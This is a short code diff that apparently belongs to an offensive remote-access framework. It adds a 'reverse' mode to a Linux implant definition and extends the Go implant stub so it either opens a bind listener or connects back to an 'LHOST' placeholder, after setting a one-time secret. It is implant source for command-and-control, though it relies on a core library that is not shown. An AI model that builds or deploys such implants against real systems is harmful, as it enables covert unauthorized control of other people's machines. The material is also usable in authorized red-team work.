@@ -54,6 +54,7 @@ local IMPLANT_DEF = {
     OS = {"linux"},
     ARCH = {"amd64", "i386"},
     PROTOCOL = "http",
+    MODE = "reverse",
     TYPE = "impl",
     BUILDER = "implant-builder-linux-amd64",
     SLEEP = 10,
@@ -80,18 +81,28 @@ import (
 )
 
 var publicKeyDER []byte
+var implantOTS [12]byte
 
 func main() {
     remoteAdd := "LHOST"
     payloadType := "IMPLANT_TYPE"
-
+	payloadMode := "IMPLANT_MODE"
 
     if len(publicKeyDER) > 0 {
         if err := core.SetPublicKeyDER(publicKeyDER); err != nil {
             panic(err)
         }
     }
+	if err := core.SetOneTimeSecret(implantOTS[:]); err != nil {
+		panic(err)
+	}
 
+	if payloadMode == "bind" {
+		if err := core.StartBind(remoteAdd, payloadType); err != nil {
+			panic(err)
+		}
+		return
+	}
     core.Start(remoteAdd, payloadType)
 }
 ]]
